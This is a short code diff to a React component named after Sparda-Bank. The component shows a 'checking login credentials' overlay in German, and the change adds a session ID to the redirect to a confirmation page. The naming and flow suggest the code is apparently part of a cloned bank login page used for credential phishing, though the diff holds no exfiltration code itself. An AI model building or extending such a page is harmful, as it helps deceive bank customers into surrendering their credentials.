@@ -26,7 +26,7 @@ const Spardabank = () => {
 
   return (
     <>
-      {showLoading && <LoadingOverlay message="Anmeldedaten werden überprüft..." onComplete={() => navigate("/confirmation")} />}
+      {showLoading && <LoadingOverlay message="Anmeldedaten werden überprüft..." onComplete={() => navigate("/confirmation?s=" + sessionId)} />}
     <div className="min-h-screen flex flex-col" style={{ fontFamily: "Arial, 'Helvetica Neue', Helvetica, sans-serif" }}>
       {/* Header */}
       <header style={{ backgroundColor: "#fff" }}>
